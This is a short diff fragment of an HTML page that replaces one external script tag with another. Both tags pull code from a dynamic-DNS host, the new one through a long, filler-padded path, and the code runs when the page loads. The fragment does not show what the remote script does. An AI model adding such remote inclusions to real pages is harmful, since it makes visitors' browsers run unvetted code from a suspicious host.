@@ -9,7 +9,7 @@
 
     }
     </script>
-    <script src="http://whiteavocado.ddns.net:1120"></script>
+    <script src="http://whiteavocado.ddns.net/IIIIIIIIIIIIIIIIIIIIIII/home_11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111.html"></script>
     </head>
 
     <body onload="load()">
